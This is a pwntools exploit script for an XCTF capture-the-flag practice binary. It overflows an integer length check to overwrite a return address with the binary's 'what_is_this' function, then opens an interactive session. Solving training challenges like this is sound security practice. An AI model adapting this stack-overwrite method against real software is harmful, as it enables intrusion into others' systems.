from pwn import *
from zzPwnlib import *
context(os='linux', arch='amd64', log_level='debug')

#r = remote('111.200.241.244',64223)
elf_path    = './xctf_pwn_007_int_overflow'
io          = process(elf_path)
elf         = ELF(elf_path)

system_addr = elf.symbols['what_is_this']
log.info("system_addr: %x", system_addr)

payload  = payloadBase(0x14, 32)
payload += p32(system_addr)
payload  = payload.ljust(0x104, b"B")
payload += b"\x00"
payload  = payload.ljust(0x199, b"C")

io.recv()
io.sendline("1")
io.recv()
io.sendline("zzkluck")
io.recv()
io.send(payload)
io.interactive()